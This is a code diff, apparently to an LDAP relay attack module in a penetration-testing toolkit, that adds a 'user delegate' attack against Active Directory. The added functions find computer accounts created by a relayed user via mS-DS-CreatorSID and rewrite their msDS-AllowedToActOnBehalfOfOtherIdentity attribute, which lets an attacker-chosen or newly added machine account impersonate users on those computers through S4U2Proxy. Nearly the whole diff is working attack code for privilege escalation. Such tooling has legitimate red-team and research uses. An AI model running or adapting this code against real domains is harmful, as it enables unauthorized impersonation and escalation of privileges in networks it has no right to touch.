@@ -61,6 +61,7 @@ dumpedAdcs = False
 alreadyEscalated = False
 alreadyAddedComputer = False
 delegatePerformed = []
+delegatePerformedUser = []
 
 #gMSA structure
 class MSDS_MANAGEDPASSWORD_BLOB(Structure):
@@ -627,6 +628,7 @@ class LDAPAttack(ProtocolAttack):
                         if b'domain' in entry['raw_attributes']['objectClass']:
                             privs['aclEscalate'] = True
                             privs['aclEscalateIn'] = dn
+                            
 
     @staticmethod
     def aceApplies(ace_guid, object_class):
@@ -770,6 +772,105 @@ class LDAPAttack(ProtocolAttack):
 
             LOG.info("Principals who can enroll using template `%s`: %s" % (entry["attributes"]["name"],
                      ", ".join(("`" + sid_map[principal] + "`" for principal in enrollment_principals))))
+
+    def getCreatorSID(self,domainDumper, usersid):
+        entries = self.client.search(domainDumper.root, '(mS-DS-CreatorSID=%s)' % usersid, attributes=['objectSid'])
+        if len(self.client.entries) == 0:
+            return False
+        else:
+            result = []
+            for entrie in self.client.entries:
+                try:
+                    dn = entrie.entry_dn
+                    sid = entrie['objectSid']
+                except IndexError:
+                    continue
+                result.append((dn,sid))
+        return result
+
+    def MFdelegateAttack(self, usersam, targetsam, domainDumper, sid, ssid):
+        global delegatePerformedUser
+
+        if not usersam:
+            usersam = self.addComputer('CN=Computers,%s' % domainDumper.root, domainDumper)
+            self.config.escalateuser = usersam
+            
+        if not sid:
+            # Get escalate user sid
+            result = self.getUserInfo(domainDumper, usersam)
+            if not result:
+                LOG.error('User to escalate does not exist!')
+                return
+            escalate_sid = str(result[1]) # sid 
+        else:
+            escalate_sid = usersam
+        
+        AttackList = self.getCreatorSID(domainDumper, ssid);
+        # LOG.debug(AttackList)
+        # LOG.debug(escalate_sid)
+        if AttackList is False:
+            LOG.info('Cannot find a computer with mS-DS-CreatorSID %s' % ssid)
+            return
+        
+        LOG.info("Try to modifiy delegation rights")
+
+        for Attack in AttackList:
+            self.addDelegation(Attack[0], escalate_sid)
+
+        delegatePerformedUser.append(targetsam)
+    
+    def addDelegation(self,target_dn,escalate_sid):
+        self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity','name'])
+        targetuser = None
+        for entry in self.client.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            targetuser = entry
+        if not targetuser:
+            LOG.error('Could not query target user properties')
+            return False
+        
+        try:
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
+            LOG.debug('Currently allowed sids:')
+            for ace in sd['Dacl'].aces:
+                LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
+        except IndexError:
+            sd = create_empty_sd()
+
+        sd['Dacl'].aces.append(create_allow_ace(escalate_sid))
+        self.client.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
+        if self.client.result['result'] == 0:
+            LOG.info('Delegation rights modified succesfully!')
+            LOG.info('%s can now impersonate users on %s via S4U2Proxy', self.config.escalateuser, targetuser['attributes']['name'])
+            return True
+        else:
+            if self.client.result['result'] == 50:
+                LOG.error('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
+            elif self.client.result['result'] == 19:
+                LOG.error('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            else:
+                LOG.error('The server returned an error: %s', self.client.result['message'])
+        return False
+
+    def userdelegateAttack(self, usersam, targetsam, domainDumper, sid):
+        global delegatePerformedUser
+        if targetsam in delegatePerformedUser:
+            LOG.info('Delegate attack already performed for this User: %s, skipping' % targetsam)
+            return
+
+        self.client.search(domainDumper.root, '(sAMAccountName=%s)' % escape_filter_chars(targetsam), attributes=['objectSid', 'primaryGroupId'])
+        
+        user = self.client.entries[0]
+        usersid = user['objectSid'].value
+        
+        tmp_flag = self.getCreatorSID(domainDumper, usersid)
+        LOG.info('Try to find the computer with mS-DS-CreatorSID %s' % usersid)
+        if tmp_flag is not False:
+            for x in tmp_flag:
+                LOG.info('DN : %s SID : %s' % (x[0], x[1]))
+        
+        self.MFdelegateAttack(usersam, targetsam, domainDumper, sid, usersid)
 
 
     def run(self):
@@ -955,6 +1056,10 @@ class LDAPAttack(ProtocolAttack):
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
             self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
+            return
+
+        if self.config.userdelegateaccess:
+            self.userdelegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
             return
 
         # Add a new computer if that is requested
